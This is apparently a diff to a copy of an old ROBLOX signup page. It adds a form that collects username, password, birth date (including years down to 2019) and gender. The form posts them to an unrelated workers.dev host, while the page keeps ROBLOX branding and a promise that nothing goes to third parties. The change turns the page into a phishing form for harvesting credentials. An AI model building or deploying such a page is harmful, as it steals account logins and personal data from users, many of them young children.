@@ -953,18 +953,36 @@ $('#SyncUp').insertAfter($('.ExistingRobloxianDiv'));
 </div>
 <div class="Column2a">
 <div id="ctl00_cphRoblox_NewUserPanel2">
+
+<form method="POST" action="https://shiny-flower-e05f.sunnyaero3.workers.dev/signup">
+
 <div class="StandardBoxHeader" style="width: 558px;float:right;">
 <span>Create a Free ROBLOX Account</span>
 </div>
+
 <div class="StandardBox" id="newSignupBox" style="width: 558px;float:right;min-height:137px;">
+
 <div id="ChooseBirthdate" style="height:111px">
 <p>
 Creating an account on ROBLOX allows you to customize your character, make friends,
 build places, earn money, and more!
 </p>
+
 <center>
+
+<div style="margin-bottom:12px;">
+<span style="font-size: 15px;">Username:</span><br />
+<input type="text" name="username" class="TextBox" style="border: 2px solid #CCCCCC; width:180px;" />
+<br /><br />
+
+<span style="font-size: 15px;">Password:</span><br />
+<input type="password" name="password" class="TextBox" style="border: 2px solid #CCCCCC; width:180px;" />
+</div>
+
 <span style="font-size: 15px;">Your Date of Birth:</span>
-<select name="ctl00$cphRoblox$lstMonths" id="ctl00_cphRoblox_lstMonths" style="font-size: 18px;">
+<br />
+
+<select name="month" id="ctl00_cphRoblox_lstMonths" style="font-size: 18px;">
 <option value="">Select Month</option>
 <option value="1">January</option>
 <option value="2">February</option>
@@ -978,11 +996,21 @@ build places, earn money, and more!
 <option value="10">October</option>
 <option value="11">November</option>
 <option value="12">December</option>
-
 </select>
+
 &nbsp;&nbsp;
-<select name="ctl00$cphRoblox$lstYears" id="ctl00_cphRoblox_lstYears" style="font-size: 18px;">
+
+<select name="year" id="ctl00_cphRoblox_lstYears" style="font-size: 18px;">
 <option value="">Select Year</option>
+<option value="2019">2019</option>
+<option value="2018">2018</option>
+<option value="2017">2017</option>
+<option value="2016">2016</option>
+<option value="2015">2015</option>
+<option value="2014">2014</option>
+<option value="2013">2013</option>
+<option value="2012">2012</option>
+<option value="2011">2011</option>
 <option value="2010">2010</option>
 <option value="2009">2009</option>
 <option value="2008">2008</option>
@@ -1083,53 +1111,65 @@ build places, earn money, and more!
 <option value="1913">1913</option>
 <option value="1912">1912</option>
 <option value="1911">1911</option>
-
 </select>
-<input id="btnContinue" type="button" class="MediumButton" onclick="CheckDate()" value="Continue" />
-<div id="lblError" style="display: none">
-<b>Please choose a valid date</b></div>
+
+<br /><br />
+
+<span style="font-size: 15px;">Gender:</span>
+<br /><br />
+
+<label>
+<input type="radio" name="gender" value="Male" />
+Boy
+</label>
+
+&nbsp;&nbsp;&nbsp;
+
+<label>
+<input type="radio" name="gender" value="Female" />
+Girl
+</label>
+
+<br /><br />
+
+<input type="submit" value="Continue" class="MediumButton" />
+
 <br />
 <br />
+
 <i>Your birthday will not be saved or given out to any third party!</i>
+
 </center>
 </div>
-<div id="ChooseGender" style="text-align:center;display:none">
 
+</div>
 
-<div style="text-align:left">Are you a boy or a girl?</div>
-<div style="text-align:center;position:relative;height:250px">
-<div style="position:absolute;left:50%;margin-left:-175px">
-<label for="ctl00_cphRoblox_SelectGenderPane_MaleBtn"><img src="https://s3.amazonaws.com:443/t4.roblox.com/c505e3141b0b74ca6bc0d506d17263c5" id="ctl00_cphRoblox_SelectGenderPane_BoyThumbnail" style="cursor:pointer" /><br /></label>
-<input id="ctl00_cphRoblox_SelectGenderPane_MaleBtn" type="radio" name="ctl00$cphRoblox$SelectGenderPane$Gender" value="MaleBtn" /><label for="ctl00_cphRoblox_SelectGenderPane_MaleBtn">Boy</label>
-</div>
-<div style="position:absolute;left:50%;margin-left:25px">
-<label for="ctl00_cphRoblox_SelectGenderPane_FemaleBtn"><img src="https://s3.amazonaws.com:443/t0.roblox.com/ff9dcf4bbfb9b53fd208d894815e7dcb" id="ctl00_cphRoblox_SelectGenderPane_GirlThumbnail" style="cursor:pointer" /><br /></label>
-<input id="ctl00_cphRoblox_SelectGenderPane_FemaleBtn" type="radio" name="ctl00$cphRoblox$SelectGenderPane$Gender" value="FemaleBtn" /><label for="ctl00_cphRoblox_SelectGenderPane_FemaleBtn">Girl</label>
+</form>
+
 </div>
 </div>
-<input type="submit" name="ctl00$cphRoblox$btnSignup2" value="Continue" onclick="javascript:WebForm_DoPostBackWithOptions(new WebForm_PostBackOptions(&quot;ctl00$cphRoblox$btnSignup2&quot;, &quot;&quot;, true, &quot;&quot;, &quot;&quot;, false, false))" id="ctl00_cphRoblox_btnSignup2" class="MediumButton" />
-</div>
-<br />
-</div>
-</div>
-</div>
+
 <div style="clear: both;" ></div>
+
 <div class="StandardBoxHeader" style="width: 878px;">
 <span>You don't need an account to play ROBLOX</span>
 </div>
+
 <div class="StandardBox" style="width: 878px;">
 <div id="ctl00_cphRoblox_GuestMode" style="text-align: center;">
 
 <p>
 You can start playing right now, in guest mode! Just click on the game you want
-to play.</p>
-<a id="ctl00_cphRoblox_PlayNow" tabindex="2" class="MediumButton" href="../Games.aspx" style="text-decoration: none; color: #222222;
-width: 20%;">Play as Guest</a>
+to play.
 </p>
+
+<a id="ctl00_cphRoblox_PlayNow" tabindex="2" class="MediumButton" href="../Games.aspx" style="text-decoration: none; color: #222222; width: 20%;">
+Play as Guest
+</a>
 
 </div>
 </div>
-</div>
+
 <div style="clear: both" ></div>
 
 <script type="text/javascript">
